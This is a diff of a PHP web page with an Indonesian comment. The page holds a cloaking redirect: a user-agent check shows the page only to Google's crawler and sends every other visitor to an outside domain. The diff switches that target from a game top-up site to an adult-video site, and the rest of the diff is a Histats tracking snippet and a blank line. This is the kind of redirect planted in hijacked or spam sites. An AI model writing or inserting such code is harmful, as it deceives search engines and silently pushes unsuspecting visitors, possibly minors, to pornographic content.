@@ -4,7 +4,7 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 
     // Jika user-agent TIDAK mengandung 'google' (case-insensitive)
     if (!preg_match('/google/i', $user_agent)) {
-        header('Location: https://topupgameku.id');
+        header('Location: https://javpornsub.net');
         exit;
     }
 }
@@ -1776,4 +1776,5 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4932699&101" alt="" border="0"></a></noscript>
 <!-- Histats.com  END  -->
   </body>
+
 </html>
